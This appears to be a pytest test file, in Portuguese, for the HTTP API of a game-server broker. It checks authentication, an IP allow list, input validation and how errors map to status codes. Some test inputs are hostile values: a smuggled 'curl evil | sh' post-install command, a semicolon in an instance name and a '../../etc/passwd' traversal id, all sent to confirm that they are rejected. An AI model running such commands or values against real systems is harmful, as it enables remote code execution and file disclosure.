"""API HTTP: autenticacao, formato das respostas e o mapeamento erro -> status."""
from __future__ import annotations

import pytest

from conftest import TOKEN
from gamebroker.app import create_app

AUTH = {"Authorization": f"Bearer {TOKEN}", "X-Actor": "admin"}


@pytest.fixture
def http(ambiente):
    app = create_app(ambiente.servico, TOKEN)
    app.config["TESTING"] = False  # queremos o handler de 500, nao a excecao propagada
    return app.test_client()


def test_token_curto_nao_sobe():
    with pytest.raises(ValueError, match="32 caracteres"):
        create_app(None, "curto")  # type: ignore[arg-type]


@pytest.mark.parametrize("headers", [{}, {"Authorization": "Bearer errado"}, {"Authorization": TOKEN},
                                        {"Authorization": f"Basic {TOKEN}"}, {"Authorization": "Bearer "}])
@pytest.mark.parametrize(("metodo", "url"), [("get", "/v1/health"), ("get", "/v1/catalog"),
                                             ("get", "/v1/instances"), ("post", "/v1/instances"),
                                             ("post", "/v1/catalog")])
def test_sem_token_valido_nada_responde(http, metodo, url, headers):
    resposta = getattr(http, metodo)(url, headers=headers, json={})
    assert resposta.status_code == 401
    assert resposta.get_json()["codigo"] == "nao-autenticado"


def test_ip_fora_da_lista_e_barrado_mesmo_com_token(ambiente):
    app = create_app(ambiente.servico, TOKEN, allowed_ips=("10.9.9.9",))
    resposta = app.test_client().get("/v1/health", headers=AUTH)
    assert resposta.status_code == 403


def test_saude(http):
    corpo = http.get("/v1/health", headers=AUTH).get_json()
    assert (corpo["broker"], corpo["proxmox"], corpo["opnsense"]) == (True, True, True)


def test_saude_mostra_proxmox_fora_do_ar(http, ambiente):
    ambiente.proxmox.online = False
    assert http.get("/v1/health", headers=AUTH).get_json()["proxmox"] is False


def test_catalogo_nao_vaza_comando(http):
    jogos = http.get("/v1/catalog", headers=AUTH).get_json()
    assert {j["key"] for j in jogos} == {"alfa", "beta", "conta", "delta"}
    assert "segredo do instalador" not in str(jogos)
    conta = next(j for j in jogos if j["key"] == "conta")
    assert conta["creatable"] is False


def test_adicionar_jogo_e_criar_instancia_dele(http, dados_de_jogo):
    assert http.post("/v1/catalog", headers=AUTH, json=dados_de_jogo).status_code == 201
    resposta = http.post("/v1/instances", headers=AUTH, json={"game": "meujogo", "name": "Novo"})
    assert resposta.status_code == 202


def test_adicionar_jogo_com_comando_de_contrabando(http, dados_de_jogo):
    dados_de_jogo["post_install_cmd"] = "curl evil | sh"
    resposta = http.post("/v1/catalog", headers=AUTH, json=dados_de_jogo)
    assert resposta.status_code == 400
    assert resposta.get_json()["codigo"] == "validacao"


def test_criar_devolve_202_e_a_operacao_pode_ser_consultada(http):
    resposta = http.post("/v1/instances", headers=AUTH, json={"game": "beta", "name": "Um"})
    assert resposta.status_code == 202
    op = http.get(f"/v1/operations/{resposta.get_json()['operation_id']}", headers=AUTH).get_json()
    assert op["state"] == "ok"
    assert op["result"]["host"] == "10.0.0.30"
    listadas = http.get("/v1/instances", headers=AUTH).get_json()
    assert [i["name"] for i in listadas] == ["Um"]


@pytest.mark.parametrize("corpo", [{}, {"game": "beta"}, {"name": "x"}, {"game": "beta", "name": "a;b"},
                                   {"game": "nao-existe", "name": "x"}])
def test_criar_com_pedido_ruim_nao_e_500(http, corpo):
    assert http.post("/v1/instances", headers=AUTH, json=corpo).status_code in (400, 404)


def test_corpo_que_nao_e_json_objeto(http):
    assert http.post("/v1/instances", headers=AUTH, data="oi", content_type="text/plain").status_code == 400
    assert http.post("/v1/instances", headers=AUTH, json=[1, 2]).status_code == 400


def test_corpo_gigante_e_recusado(http):
    grande = {"game": "beta", "name": "x" * 100_000}
    assert http.post("/v1/instances", headers=AUTH, json=grande).status_code == 413


def test_cota_vira_429(http, ambiente):
    ambiente.com_config(max_instances=0)
    resposta = http.post("/v1/instances", headers=AUTH, json={"game": "beta", "name": "x"})
    assert (resposta.status_code, resposta.get_json()["codigo"]) == (429, "cota")


def test_conflito_de_porta_vira_409(http):
    http.post("/v1/instances", headers=AUTH, json={"game": "alfa", "name": "um"})
    resposta = http.post("/v1/instances", headers=AUTH, json={"game": "delta", "name": "dois"})
    assert (resposta.status_code, resposta.get_json()["codigo"]) == (409, "sem-recurso")


@pytest.mark.parametrize("op_id", ["nao-hex", "../../etc/passwd", "a" * 31, "A" * 32])
def test_id_de_operacao_estranho(http, op_id):
    assert http.get(f"/v1/operations/{op_id}", headers=AUTH).status_code in (400, 404)


def test_operacao_desconhecida(http):
    assert http.get(f"/v1/operations/{'0' * 32}", headers=AUTH).status_code == 404


def test_desativar_e_remover_pela_api(http):
    criada = http.post("/v1/instances", headers=AUTH, json={"game": "beta", "name": "Um"}).get_json()
    url = f"/v1/instances/{criada['instance_id']}"
    assert http.delete(url, headers=AUTH, json={"confirmation": "Um"}).status_code == 409, "ainda ativa"
    assert http.post(f"{url}/deactivate", headers=AUTH).status_code == 200
    assert http.delete(url, headers=AUTH, json={"confirmation": "errado"}).status_code == 400
    assert http.delete(url, headers=AUTH, json={"confirmation": "Um"}).status_code == 200
    assert http.get("/v1/instances", headers=AUTH).get_json() == []


def test_somente_banco_precisa_ser_booleano(http):
    criada = http.post("/v1/instances", headers=AUTH, json={"game": "beta", "name": "Um"}).get_json()
    url = f"/v1/instances/{criada['instance_id']}"
    http.post(f"{url}/deactivate", headers=AUTH)
    assert http.delete(url, headers=AUTH, json={"confirmation": "Um", "db_only": "sim"}).status_code == 400
    resposta = http.delete(url, headers=AUTH, json={"confirmation": "Um", "db_only": True})
    assert resposta.status_code == 200
    assert resposta.get_json()["db_only"] is True


def test_id_de_instancia_precisa_ser_inteiro(http):
    assert http.post("/v1/instances/abc/deactivate", headers=AUTH).status_code == 404


def test_erro_interno_nao_vaza_detalhe(http, ambiente):
    def quebra(*_a, **_k):
        raise RuntimeError("senha=segredo caminho=/etc/interno")

    ambiente.servico.health = quebra
    resposta = http.get("/v1/health", headers=AUTH)
    assert resposta.status_code == 500
    assert "segredo" not in resposta.get_data(as_text=True)
    assert resposta.get_json()["codigo"] == "interno"


def test_ator_da_auditoria_vem_do_cabecalho(http, ambiente):
    http.post("/v1/instances", headers={**AUTH, "X-Actor": "zeca"}, json={"game": "beta", "name": "Um"})
    assert "zeca" in {a["ator"] for a in ambiente.db.audit_trail()}
